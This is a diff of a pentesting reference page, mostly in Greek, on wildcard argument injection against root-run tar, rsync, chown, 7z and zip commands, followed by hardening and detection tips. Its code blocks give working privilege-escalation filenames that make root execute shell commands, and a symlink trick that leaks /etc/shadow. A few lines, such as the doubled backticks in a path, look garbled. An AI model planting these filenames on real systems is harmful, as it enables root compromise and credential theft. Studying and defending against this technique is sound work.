@@ -1,60 +1,123 @@
+# Wildcards Spare Tricks
+
 {{#include ../../banners/hacktricks-training.md}}
 
-## chown, chmod
+> Wildcard (aka *glob*) **εισαγωγή επιχειρημάτων** συμβαίνει όταν ένα προνομιακό σενάριο εκτελεί ένα Unix δυαδικό όπως `tar`, `chown`, `rsync`, `zip`, `7z`, … με ένα μη παραquoted wildcard όπως `*`.
+> Δεδομένου ότι το shell επεκτείνει το wildcard **πριν** εκτελέσει το δυαδικό, ένας επιτιθέμενος που μπορεί να δημιουργήσει αρχεία στον τρέχοντα κατάλογο μπορεί να κατασκευάσει ονόματα αρχείων που αρχίζουν με `-` ώστε να ερμηνεύονται ως **επιλογές αντί για δεδομένα**, αποτελεσματικά λαθραία σημαίες ή ακόμα και εντολές.
+> Αυτή η σελίδα συγκεντρώνει τις πιο χρήσιμες πρωτογενείς μεθόδους, πρόσφατες έρευνες και σύγχρονες ανιχνεύσεις για το 2023-2025.
 
-Μπορείτε να **υποδείξετε ποιος είναι ο ιδιοκτήτης του αρχείου και ποιες άδειες θέλετε να αντιγράψετε για τα υπόλοιπα αρχεία**
+## chown / chmod
+
+Μπορείτε να **αντιγράψετε τον ιδιοκτήτη/ομάδα ή τα δικαιώματα ενός αυθαίρετου αρχείου** εκμεταλλευόμενοι τη σημαία `--reference`:
 ```bash
-touch "--reference=/my/own/path/filename"
+# attacker-controlled directory
+touch "--reference=/root/secret``file"   # ← filename becomes an argument
 ```
-Μπορείτε να εκμεταλλευτείτε αυτό χρησιμοποιώντας [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(συνδυασμένη επίθεση)_\
-Περισσότερες πληροφορίες στο [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
-
-## Tar
-
-**Εκτέλεση αυθαίρετων εντολών:**
+Όταν ο root εκτελεί αργότερα κάτι όπως:
 ```bash
+chown -R alice:alice *.php
+chmod -R 644 *.php
+```
+`--reference=/root/secret``file` έχει εισαχθεί, προκαλώντας *όλα* τα αντίστοιχα αρχεία να κληρονομήσουν την ιδιοκτησία/δικαιώματα του `/root/secret``file`.
+
+*PoC & εργαλείο*: [`wildpwn`](https://github.com/localh0t/wildpwn) (συνδυασμένη επίθεση).
+Δείτε επίσης το κλασικό έγγραφο της DefenseCode για λεπτομέρειες.
+
+---
+
+## tar
+
+### GNU tar (Linux, *BSD, busybox-full)
+
+Εκτελέστε αυθαίρετες εντολές εκμεταλλευόμενοι τη δυνατότητα **checkpoint**:
+```bash
+# attacker-controlled directory
+echo 'echo pwned > /tmp/pwn' > shell.sh
+chmod +x shell.sh
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
-Μπορείτε να εκμεταλλευτείτε αυτό χρησιμοποιώντας [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_\
-Περισσότερες πληροφορίες στο [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Μόλις ο root εκτελέσει π.χ. `tar -czf /root/backup.tgz *`, το `shell.sh` εκτελείται ως root.
 
-## Rsync
+### bsdtar / macOS 14+
 
-**Εκτέλεση αυθαίρετων εντολών:**
+Ο προεπιλεγμένος `tar` σε πρόσφατο macOS (βασισμένος σε `libarchive`) *δεν* υλοποιεί το `--checkpoint`, αλλά μπορείτε να επιτύχετε εκτέλεση κώδικα με την επιλογή **--use-compress-program** που σας επιτρέπει να καθορίσετε έναν εξωτερικό συμπιεστή.
 ```bash
-Interesting rsync option from manual:
-
--e, --rsh=COMMAND           specify the remote shell to use
---rsync-path=PROGRAM    specify the rsync to run on remote machine
+# macOS example
+touch "--use-compress-program=/bin/sh"
 ```
+Όταν ένα προνομιακό σενάριο εκτελεί `tar -cf backup.tar *`, θα ξεκινήσει το `/bin/sh`.
 
+---
+
+## rsync
+
+`rsync` σας επιτρέπει να παρακάμψετε το απομακρυσμένο κέλυφος ή ακόμη και το απομακρυσμένο δυαδικό μέσω σημαιών γραμμής εντολών που ξεκινούν με `-e` ή `--rsync-path`:
 ```bash
-touch "-e sh shell.sh"
+# attacker-controlled directory
+touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
 ```
-Μπορείτε να εκμεταλλευτείτε αυτό χρησιμοποιώντας [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_\
-Περισσότερες πληροφορίες στο [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Αν ο root αργότερα αρχειοθετήσει τον κατάλογο με `rsync -az * backup:/srv/`, η εισαγόμενη σημαία δημιουργεί το shell σας στην απομακρυσμένη πλευρά.
 
-## 7z
+*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).
 
-Στο **7z** ακόμη και χρησιμοποιώντας `--` πριν από `*` (σημειώστε ότι το `--` σημαίνει ότι η επόμενη είσοδος δεν μπορεί να θεωρηθεί ως παράμετροι, οπότε μόνο διαδρομές αρχείων σε αυτή την περίπτωση) μπορείτε να προκαλέσετε ένα τυχαίο σφάλμα για να διαβάσετε ένα αρχείο, οπότε αν μια εντολή όπως η παρακάτω εκτελείται από τον root:
+---
+
+## 7-Zip / 7z / 7za
+
+Ακόμα και όταν το προνομιακό σενάριο *αμυντικά* προσθέτει το wildcard με `--` (για να σταματήσει την ανάλυση επιλογών), η μορφή 7-Zip υποστηρίζει **αρχεία λίστας αρχείων** προσθέτοντας το όνομα αρχείου με `@`. Συνδυάζοντας αυτό με ένα symlink σας επιτρέπει να *εξάγετε αυθαίρετα αρχεία*:
 ```bash
-7za a /backup/$filename.zip -t7z -snl -p$pass -- *
+# directory writable by low-priv user
+cd /path/controlled
+ln -s /etc/shadow   root.txt      # file we want to read
+touch @root.txt                  # tells 7z to use root.txt as file list
 ```
-Και μπορείτε να δημιουργήσετε αρχεία στον φάκελο όπου εκτελείται αυτό, μπορείτε να δημιουργήσετε το αρχείο `@root.txt` και το αρχείο `root.txt` που είναι ένα **symlink** στο αρχείο που θέλετε να διαβάσετε:
+Αν ο root εκτελέσει κάτι όπως:
 ```bash
-cd /path/to/7z/acting/folder
-touch @root.txt
-ln -s /file/you/want/to/read root.txt
+7za a /backup/`date +%F`.7z -t7z -snl -- *
 ```
-Τότε, όταν εκτελείται το **7z**, θα θεωρήσει το `root.txt` ως ένα αρχείο που περιέχει τη λίστα των αρχείων που πρέπει να συμπιέσει (αυτό υποδεικνύει η ύπαρξη του `@root.txt`) και όταν το 7z διαβάσει το `root.txt`, θα διαβάσει το `/file/you/want/to/read` και **καθώς το περιεχόμενο αυτού του αρχείου δεν είναι μια λίστα αρχείων, θα εμφανίσει ένα σφάλμα** δείχνοντας το περιεχόμενο.
+7-Zip θα προσπαθήσει να διαβάσει `root.txt` (→ `/etc/shadow`) ως λίστα αρχείων και θα αποτύχει, **εκτυπώνοντας το περιεχόμενο στο stderr**.
 
-_Περισσότερες πληροφορίες στα Write-ups του box CTF από το HackTheBox._
+---
 
-## Zip
+## zip
 
-**Εκτέλεση αυθαίρετων εντολών:**
+`zip` υποστηρίζει τη σημαία `--unzip-command` που μεταφέρεται *κατά λέξη* στη γραμμή εντολών του συστήματος όταν θα δοκιμαστεί το αρχείο:
 ```bash
-zip name.zip files -T --unzip-command "sh -c whoami"
+zip result.zip files -T --unzip-command "sh -c id"
 ```
+Inject the flag via a crafted filename and wait for the privileged backup script to call `zip -T` (test archive) on the resulting file.
+
+---
+
+## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)
+
+The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:
+
+| Binary | Flag to abuse | Effect |
+| --- | --- | --- |
+| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Διαβάστε το περιεχόμενο του αρχείου |
+| `flock` | `-c <cmd>` | Εκτέλεση εντολής |
+| `git`   | `-c core.sshCommand=<cmd>` | Εκτέλεση εντολής μέσω git over SSH |
+| `scp`   | `-S <cmd>` | Δημιουργία αυθαίρετου προγράμματος αντί για ssh |
+
+These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.
+
+---
+
+## Detection & Hardening
+
+1. **Disable shell globbing** in critical scripts: `set -f` (`set -o noglob`) prevents wildcard expansion.
+2. **Quote or escape** arguments: `tar -czf "$dst" -- *` is *not* safe — prefer `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
+3. **Explicit paths**: Use `/var/www/html/*.log` instead of `*` so attackers cannot create sibling files that start with `-`.
+4. **Least privilege**: Run backup/maintenance jobs as an unprivileged service account instead of root whenever possible.
+5. **Monitoring**: Elastic’s pre-built rule *Potential Shell via Wildcard Injection* looks for `tar --checkpoint=*`, `rsync -e*`, or `zip --unzip-command` immediately followed by a shell child process. The EQL query can be adapted for other EDRs.
+
+---
+
+## References
+
+* Elastic Security – Potential Shell via Wildcard Injection Detected rule (last updated 2025)
+* Rutger Flohil – “macOS — Tar wildcard injection” (Dec 18 2024)
+
 {{#include ../../banners/hacktricks-training.md}}
